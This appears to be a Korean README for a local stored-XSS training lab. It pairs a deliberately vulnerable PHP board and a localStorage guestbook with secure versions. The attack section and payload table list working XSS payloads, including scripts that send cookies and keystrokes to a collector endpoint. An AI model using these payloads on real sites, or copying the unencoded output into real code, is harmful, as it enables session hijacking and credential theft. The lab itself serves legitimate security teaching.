# 02. Stored XSS 실습

> xss.md 연결: 3장 (저장형 XSS), 1장 (세션 하이재킹, 키로깅 파급력)

## 실행 방법

### PHP 버전 (SQLite)
```bash
# 취약 버전
php -S localhost:8080 -t xss/02-stored/vulnerable/php/
# 브라우저: http://localhost:8080/board.php

# 안전 버전
php -S localhost:8080 -t xss/02-stored/secure/php/
# 브라우저: http://localhost:8080/board_safe.php
```

### Vanilla JS 버전 (localStorage)
```bash
open xss/02-stored/vulnerable/js/guestbook.html
open xss/02-stored/secure/js/guestbook_safe.html
```

## 공격 방법

### S-01. PHP board.php - 게시판 Stored XSS

**취약 코드**: `echo $post['title'];` (인코딩 없이 DB 저장값 출력)

**공격 절차**:
1. `http://localhost:8080/board.php` 접속
2. 제목 입력란에 페이로드 입력 후 등록
3. 페이지 새로고침 → 스크립트 자동 실행
4. **다른 브라우저 탭에서 같은 URL 접속** → 역시 실행됨 (Stored의 핵심!)

**페이로드**:
```html
<!-- 제목에 입력 -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.cookie)>

<!-- 세션 하이재킹 연계 (05-session-hijack 서버 필요) -->
<script>new Image().src="http://localhost:9000/collector.php?c="+document.cookie</script>
```

### S-02. Vanilla JS guestbook.html - localStorage Stored XSS

**공격 절차**:
1. `guestbook.html` 브라우저로 열기
2. 이름: 아무거나, 메시지: `<img src=x onerror=alert('Stored!')>` 입력
3. 등록 클릭 → 즉시 실행
4. **F5 새로고침** → localStorage에서 불러와 또 실행!
5. **탭 닫고 다시 열기** → 여전히 실행됨 (영속성 확인)

## 페이로드 모음

| 목적 | 페이로드 |
|---|---|
| 기본 동작 확인 | `<script>alert(document.domain)</script>` |
| 쿠키 탈취 | `<script>alert(document.cookie)</script>` |
| 외부 서버로 전송 | `<script>new Image().src="http://localhost:9000/collector.php?c="+document.cookie</script>` |
| 페이지 변조 | `<script>document.body.style.background='red'</script>` |
| 키로거 | `<script>document.addEventListener('keydown',function(e){new Image().src="http://localhost:9000/collector.php?k="+e.key})</script>` |

## Reflected vs Stored 차이

| | Reflected | Stored |
|---|---|---|
| 저장 위치 | URL (서버 미저장) | DB / localStorage |
| 피해 범위 | URL 클릭한 사람만 | **페이지 방문하는 모든 사람** |
| 지속성 | URL 공유 중단 시 종료 | **삭제 전까지 영속** |
| 위험도 | 중 | **높음** |
